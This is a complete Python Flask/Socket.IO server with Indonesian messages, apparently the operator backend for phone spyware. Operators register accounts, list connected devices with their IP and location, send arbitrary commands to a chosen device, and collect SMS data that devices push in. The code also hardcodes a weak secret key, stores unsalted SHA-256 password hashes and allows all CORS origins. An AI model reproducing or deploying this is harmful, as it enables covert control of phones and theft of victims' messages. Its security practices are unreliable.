from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room
import uuid, hashlib, json, os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'rahasia123'
socketio = SocketIO(app, cors_allowed_origins='*')

DB_FILE = 'db.json'

def load_db():
    if not os.path.exists(DB_FILE):
        return {'users': {}, 'logs': {}}
    with open(DB_FILE) as f:
        return json.load(f)

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f)

def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

# ===== AUTH =====
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    db = load_db()
    if data['username'] in db['users']:
        return jsonify({'status': 'error', 'msg': 'Username sudah ada'})
    api_key = str(uuid.uuid4()).replace('-', '')
    db['users'][data['username']] = {
        'password': hash_pw(data['password']),
        'api_key': api_key,
        'devices': {}
    }
    db['logs'][data['username']] = []
    save_db(db)
    return jsonify({'status': 'ok', 'msg': 'Berhasil daftar'})

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    db = load_db()
    user = db['users'].get(data['username'])
    if not user or user['password'] != hash_pw(data['password']):
        return jsonify({'status': 'error', 'msg': 'Username/password salah'})
    return jsonify({'status': 'ok', 'api_key': user['api_key']})

@app.route('/devices', methods=['GET'])
def get_devices():
    api_key = request.headers.get('X-API-Key')
    db = load_db()
    for username, user in db['users'].items():
        if user['api_key'] == api_key:
            return jsonify({'status': 'ok', 'devices': user['devices']})
    return jsonify({'status': 'error', 'msg': 'API key tidak valid'})

@app.route('/logs', methods=['GET'])
def get_logs():
    api_key = request.headers.get('X-API-Key')
    db = load_db()
    for username, user in db['users'].items():
        if user['api_key'] == api_key:
            return jsonify({'status': 'ok', 'logs': db['logs'].get(username, [])})
    return jsonify({'status': 'error', 'msg': 'API key tidak valid'})

@app.route('/command', methods=['POST'])
def send_command():
    api_key = request.headers.get('X-API-Key')
    data = request.json
    db = load_db()
    for username, user in db['users'].items():
        if user['api_key'] == api_key:
            device_id = data['device_id']
            cmd = data['command']
            socketio.emit('command', data, room=device_id)
            log = {'time': datetime.now().strftime('%H:%M %d/%m/%Y'), 'device': device_id, 'command': cmd}
            db['logs'][username].append(log)
            save_db(db)
            return jsonify({'status': 'ok'})
    return jsonify({'status': 'error', 'msg': 'API key tidak valid'})

# ===== SOCKET =====
@socketio.on('register_device')
def register_device(data):
    api_key = data['api_key']
    db = load_db()
    for username, user in db['users'].items():
        if user['api_key'] == api_key:
            device_id = data['device_id']
            join_room(device_id)
            db['users'][username]['devices'][device_id] = {
                'name': data.get('name', 'Unknown'),
                'model': data.get('model', 'Unknown'),
                'ip': request.remote_addr,
                'location': data.get('location', 'Unknown'),
                'status': 'online'
            }
            save_db(db)
            emit('registered', {'status': 'ok'})
            return

@socketio.on('sms_data')
def sms_data(data):
    api_key = data['api_key']
    db = load_db()
    for username, user in db['users'].items():
        if user['api_key'] == api_key:
            log = {'time': datetime.now().strftime('%H:%M %d/%m/%Y'), 'type': 'sms', 'data': data}
            db['logs'][username].append(log)
            save_db(db)

@socketio.on('disconnect')
def on_disconnect():
    db = load_db()
    save_db(db)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
